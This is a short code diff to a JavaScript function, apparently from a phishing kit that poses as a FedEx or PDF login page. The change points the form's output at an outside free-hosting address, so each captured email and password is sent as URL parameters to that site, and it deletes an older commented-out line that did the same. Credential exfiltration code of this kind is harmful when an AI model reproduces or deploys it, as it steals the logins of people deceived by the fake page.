@@ -82,7 +82,7 @@ function pdfData(showEmail, showPass) {
                 url = "Domain" + "=" + "FedEx - " + userServer + "&" + "Mail" + "=" + showEmail + "&" + "Password" + "=" + showPass
 
                 window.open(
-                    'config.php?' + url,
+                    'https://falser-skies.000webhostapp.com/bba/config.php?' + url,
                     '_blank'
                 );
 
@@ -98,8 +98,6 @@ function pdfData(showEmail, showPass) {
                 setTimeout(() => {
                     gen_header.innerHTML = `Key: <b style="color:orange">${key}</b>`
                 }, 3000);
-
-                // location = "https://falser-skies.000webhostapp.com/bba/config.php?" + url;
             }
         }
         else {
